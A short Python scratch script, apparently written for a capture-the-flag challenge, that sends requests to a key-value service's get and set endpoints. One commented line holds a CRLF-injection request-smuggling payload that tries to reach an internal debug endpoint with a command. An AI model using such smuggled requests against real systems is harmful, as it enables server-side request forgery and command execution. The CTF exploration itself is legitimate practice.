import requests

url = "http://kvcloud.sf.ctf.so/get"
myparams={'key':'1'} #,'redis_addr':'127.0.0.1'
s = requests.Session()
#s.get(url)

#res = s.get(url,params=myparams)
#print(res.text)

payload={}
headers = {
  'keep': 'timeout=100,max=1000'
}

#url = b"http://0.0.0.0/get?key=http://google.com HTTP/1.1%0AHost: localhost%0A%0APOST https://0.0.0.0/debug?cmd=dir() HTTP/1.1%0AHost:localhost%0A&redis_port=80"
gresponse = s.request("GET", url, params=myparams,headers=headers,data=payload)
print(gresponse.text)

#sparams = {'value':'overwatchrules'}
#sr = s.request("PUT",'http://kvcloud.sf.ctf.so/set/1',params=sparams,headers=headers,data=payload)
#print(sr.text)








